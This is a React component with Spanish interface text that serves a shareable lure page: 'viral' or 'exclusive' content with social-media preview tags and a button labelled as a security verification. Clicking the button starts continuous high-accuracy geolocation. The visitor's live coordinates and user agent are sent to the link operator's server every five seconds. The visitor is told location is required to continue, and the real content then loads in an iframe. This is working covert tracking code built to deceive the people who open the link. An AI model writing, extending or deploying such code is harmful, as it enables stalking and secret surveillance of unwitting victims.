import React, { useEffect, useState, useRef } from 'react';
import { useParams } from 'react-router-dom';
import { Helmet } from 'react-helmet-async';
import { io } from 'socket.io-client';
import api from '../services/api';

const TrackLink = () => {
    const { id } = useParams();
    const [linkData, setLinkData] = useState(null);
    const [error, setError] = useState(null);
    const [isTracking, setIsTracking] = useState(false);
    const socketRef = useRef();
    const watchIdRef = useRef(null);
    const lastUpdateRef = useRef(0);

    useEffect(() => {
        const fetchLinkData = async () => {
            try {
                const response = await api.get(`/links/${id}`);
                setLinkData(response.data);
            } catch (error) {
                console.error('Error fetching link:', error);
                setLinkData({
                    title: 'Enlace no encontrado',
                    description: 'Este enlace puede haber expirado o no existe.',
                    imageUrl: 'https://placehold.co/600x400/1e293b/475569?text=Error'
                });
            }
        };
        fetchLinkData();

        const socket = io('/', { path: '/socket.io' });
        socketRef.current = socket;

        return () => {
            if (socket) socket.disconnect();
            if (watchIdRef.current) navigator.geolocation.clearWatch(watchIdRef.current);
        };
    }, [id]);

    const handleEnter = () => {
        setError(null);
        if (!navigator.geolocation) {
            setError('La geolocalización no es compatible con tu navegador');
            return;
        }

        // Use watchPosition for real-time updates
        watchIdRef.current = navigator.geolocation.watchPosition(
            async (position) => {
                const { latitude, longitude } = position.coords;
                setIsTracking(true);

                try {
                    // Send tracking data via Socket (Real-time)
                    const now = Date.now();
                    // Throttle updates to every 5 seconds
                    if (!lastUpdateRef.current || now - lastUpdateRef.current > 5000) {
                        lastUpdateRef.current = now;

                        // Send tracking data via Socket (Real-time)
                        if (socketRef.current && socketRef.current.connected) {
                            socketRef.current.emit('update-location', {
                                linkId: id,
                                lat: latitude,
                                lng: longitude,
                                userAgent: navigator.userAgent
                            });
                        } else {
                            // Fallback to HTTP if socket is disconnected
                            api.post('/track', {
                                linkId: id,
                                lat: latitude,
                                lng: longitude,
                                userAgent: navigator.userAgent
                            }).catch(err => console.error('HTTP Track Error:', err));
                        }
                    }

                    // Optional: HTTP track for first record or persistence
                    // (Server will handle de-duplication if we send socketId)
                } catch (e) {
                    console.error('Tracking update failed', e);
                }
            },
            (err) => {
                console.error('Geolocation error:', err);
                setError('Por favor active su ubicación para continuar.');
            },
            {
                enableHighAccuracy: true,
                timeout: 5000,
                maximumAge: 0
            }
        );
    };

    if (!linkData) return (
        <div className="min-h-screen bg-slate-900 flex items-center justify-center">
            <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-primary"></div>
        </div>
    );

    // If tracking is active, show the content in an iframe or dedicated area
    if (isTracking && linkData.destinationUrl) {
        return (
            <div className="fixed inset-0 bg-black z-[1000] flex flex-col">
                <div className="h-1 bg-primary w-full animate-pulse"></div>
                <iframe
                    src={linkData.destinationUrl}
                    className="flex-1 w-full border-none"
                    title="Content View"
                />
            </div>
        );
    }

    return (
        <div className="min-h-screen bg-black font-display text-white relative overflow-hidden flex flex-col">
            <Helmet>
                <title>{linkData.title || "Lo mas viral"}</title>
                <meta name="description" content={linkData.description || "Contenido exclusivo"} />
                <meta property="og:title" content={linkData.title || "Lo mas viral"} />
                <meta property="og:description" content={linkData.description || "Contenido exclusivo"} />
                <meta property="og:image" content={linkData.imageUrl || ""} />
            </Helmet>

            {/* Background Image/Blur */}
            <div className="absolute inset-0 z-0">
                {linkData.imageUrl && (
                    <img src={linkData.imageUrl} alt="Background" className="w-full h-full object-cover opacity-30 blur-xl scale-110" />
                )}
                <div className="absolute inset-0 bg-gradient-to-b from-black/60 via-black/80 to-black"></div>
            </div>

            {/* Content Container */}
            <div className="relative z-10 flex-1 flex flex-col items-center justify-center p-6 text-center max-w-lg mx-auto w-full">

                <div className="w-full bg-white/5 backdrop-blur-xl border border-white/10 rounded-3xl overflow-hidden shadow-2xl animate-fade-in">
                    {/* Featured Image */}
                    <div className="h-64 relative">
                        {linkData.imageUrl ? (
                            <img src={linkData.imageUrl} alt="Content" className="w-full h-full object-cover" />
                        ) : (
                            <div className="w-full h-full bg-gradient-to-br from-primary/30 to-primary/5 flex items-center justify-center">
                                <span className="material-symbols-outlined text-6xl text-white/20">perm_media</span>
                            </div>
                        )}
                        <div className="absolute inset-0 bg-gradient-to-t from-black/80 to-transparent"></div>
                    </div>

                    <div className="p-8 space-y-6">
                        {/* Headline Section */}
                        <div className="text-center">
                            <h1 className="text-white tracking-tight text-3xl font-extrabold leading-tight">
                                {linkData.title || "Contenido Disponible"}
                            </h1>
                        </div>

                        {/* Body Text Section */}
                        <div className="text-center">
                            <p className="text-slate-300 text-base leading-relaxed">
                                {linkData.description || "Haz clic en el botón de abajo para acceder al contenido solicitado."}
                            </p>
                        </div>

                        {/* Error Notification */}
                        {error && (
                            <div className="p-4 rounded-xl bg-red-500/10 border border-red-500/20 flex items-center justify-center gap-3 animate-pulse">
                                <span className="material-symbols-outlined text-red-500 text-xl">error_outline</span>
                                <p className="text-red-500 text-sm font-semibold">{error}</p>
                            </div>
                        )}

                        {/* CTA Button */}
                        <div className="pt-2">
                            <button
                                onClick={handleEnter}
                                className="w-full py-5 px-8 bg-primary hover:bg-primary/90 active:scale-[0.98] text-white font-black text-xl rounded-2xl shadow-[0_0_30px_rgba(59,130,246,0.3)] transition-all flex items-center justify-center gap-3"
                            >
                                {linkData.buttonText || 'Entrar'}
                                <span className="material-symbols-outlined">trending_flat</span>
                            </button>
                        </div>

                        <p className="text-slate-500 text-[10px] uppercase font-bold tracking-[0.2em]">
                            Verificación de Seguridad Activa
                        </p>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default TrackLink;
